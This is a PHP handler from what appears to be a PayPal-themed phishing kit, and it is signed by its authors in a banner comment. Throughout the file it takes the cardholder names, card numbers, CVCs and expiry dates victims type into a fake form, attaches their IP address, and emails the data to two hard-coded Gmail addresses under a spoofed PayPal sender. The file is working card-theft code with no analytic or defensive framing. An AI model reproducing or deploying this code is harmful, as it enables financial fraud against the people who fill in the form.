<?php

/*
╔═════════════════════════════╗
╠═══ Fahmi trabelsi safouen═══╣
╠═══════              ════════╣
╠═════════           ═════════╣
╠═                          ══╣
╚═════════════════════════════╝
*/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Country = $_POST['_countr'];

$message .= "=========[Card Info]=========\n";
$message .= "=========[Card 1]=========\n";
$message .= "Card Holder		: ".$_POST['_fulln']."\n";
$message .= "Card Number		: ".$_POST['dftCN']."\n";
$message .= "CVC			  : ".$_POST['dftVC']."\n";
$message .= "Exp Date		: ".$_POST['datex']."\n";
$message .= "=========[Card 1]=========\n";
$message .= "Card Number		: ".$_POST['dftCN2']."\n";
$message .= "CVC			  : ".$_POST['dftVC2']."\n";
$message .= "Exp Date		: ".$_POST['datex2']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BY TraBelsi Fahmi]=========";


$to = "trabelsiifahmi@gmail.com,safou22wow@gmail.com";
$subject = "Card Info (75%) $Country [$ip]";
$headers = "From: Fahmi/Safwen (75%)<paypal@support.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);

header("Location:save.php");


?>
